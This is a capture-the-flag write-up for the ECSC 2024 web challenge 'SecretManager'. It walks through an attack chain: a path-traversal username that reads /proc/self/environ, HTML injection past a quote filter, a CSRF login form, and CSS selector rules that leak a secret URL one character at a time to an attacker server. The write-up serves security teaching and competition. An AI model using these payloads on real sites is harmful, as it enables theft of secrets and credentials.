# ECSC 2024 - Jeopardy

## [web] SecretManager (4 solves)

We developed a new service, but we don't like bots...

This is a remote challenge, you can connect with:

Site: [http://secretmanager.challs.todo.it](http://secretmanager.challs.todo.it)

Author: Stefano Alberto <@Xatophi>

## Overview

The challenge consists of three main components:

- The password-protected React application for creating and retrieving secrets
- A paywall that allows authorized users to obtain the password to access the application
- A service that allows a url to be reported to a headless bot

## Solution

### Get the app password

First, it is necessary to obtain the application password, doing so would require passing a series of captcha challenges.

![captcha challenge](writeup/captcha.png)

As the size of the captcha increases, it can no longer be resolved due to approximation errors in the generated numbers. In fact, to generate the captcha the string of random digits is converted to Number using the parseInt function.
This mechanism on large numbers causes the least significant digits to be approximated, making it impossible to solve the challenge accurately.

To recover the challenge, it is possible to exploit a path traversal in the paywall api, specifically in the username, which is present in this portion of the code.

```js
app.get('/captcha.png', (req, res) => {
    res.setHeader('Content-Type', 'image/png');
    res.send(fs.readFileSync(path.join( '/tmp/', req.session.user)));
});
```

The password is found among the server environment variables, to obtain it, simply log in with the username `x/../../proc/self/environ` and make a request to `/captcha.png` to read the environment variables.

### Leak the flag url

The flag is saved as a secret in the application by the headless bot before visiting the url provided by the user.

#### HTML injection

The paywall also offers a payment page reachable to `/pay` and vulnerable to HTML injection. Scripts cannot be executed because of the CSP header returned by the server.

To inject arbitrary HTML tags, it is necessary to bypass the filter that does not allow the `"` character in inputs entered in the HTML template.

On the payment page it is possible to have two injection points that filter only the `"` character, the username and the `card` paramenter.

```html
<script nonce="<%- nonce %>">
    document.getElementById('logout-btn').addEventListener('click', () => {
    if (confirm("Are you sure to logout as <%- user.replaceAll('"', '') %>? Your progress will be lost.")) {
        window.location.href = '/logout';
    }
    });
</script>
```

```html
<input class="form-control my-2" id="card" name="card" value="<%- card.replaceAll('"','') %>" required>
```

By exploiting the HTML comments `<!--` and both injection points it is possible to insert arbitrary HTML tags.

For example, the two payloads to perform the injection are given:

- username: `aaa<!--<script>`
- card: `aa--></script><b>arbitrary html</b>`

#### CSRF

To set the username we need to perform the attack on the bot's browser, we need to perform a CSRF on the login.

This is done by serving a web page with this content for the bot to visit.

```html
<form id=test action="https://secretmanager.xyz/login" method="post">
    <input name="username" value="aaa<!--<script>">
</form>

<script>test.submit()</script>
```

#### Leak the flag URL

CSP allows for arbitrary styles, this would allow us to get the flag address character by character by leveraging CSS rules to make requests to one of our servers.

If we can insert this style rule into a page that contains a link to the flag secret, it is possible to leak the url one character at a time.

```html
<style>
    a[href*=secret\\/a] { background: url(//my-server/?c=a); }
    a[href*=secret\\/b] { background: url(//my-server/?c=b); }
    a[href*=secret\\/c] { background: url(//my-server/?c=c); }
    ...
</style>
```

To import the flag we can force the browser to render the React application without violating the CSP in this way.

```html
<div id=root></div><script type=module crossorigin src=/app/static/js/main.87ffa16d.js></script>
```

Finally, to force react-router-dom to load the page we are interested in (/app/list) containing the leaks to the secret with the flag, we can insert this iframe into the same page.

```html
<iframe name=defaultView src=/app/my-secrets></iframe>
```

The HTML tags to be injected to get the leak of the first character of the flag id is as follows.

```html
<iframe srcdoc='
    <iframe name=defaultView src=/app/my-secrets></iframe>
    <style>
        a[href*=secret\\/a] { background: url(//my-server/?c=a); }
        a[href*=secret\\/b] { background: url(//my-server/?c=b); }
        a[href*=secret\\/c] { background: url(//my-server/?c=c); }
        ...
    </style>
    <div id=root></div>
    <script type=module crossorigin src=/app/static/js/main.87ffa16d.js></script>
'></iframe>
```

By repeating this process for each character, the entire flag id can be obtained with which the flag can be retrieved with a simple GET request to `/api/secret/FLAG_ID`.

#### Putting all together

To exploit the challenge, we need to have the headless bot visit the following page.

index.html

```html
<script>
    window.open("/expl.html"); // CSRF on the username
    window.open("https://user:APP_PASSWORD@secretmanager.xyz/app"); // to log in the app the bot browser

    setTimeout(() => {{
        location.href = "https://user:APP_PASSWORD@secretmanager.xyz/app/pay?card=a--%3E%3C/script%3E%3Ciframe%20srcdoc=..."; // exploit page
    }} , 1000);
</script>
```

And exploit the CSRF on the username with this page.

expl.html

```html
<form id=test action="{URL}/login" method="post">
    <input name="username" value="aaa<!--<script>">
</form>

<script>test.submit()</script>
```
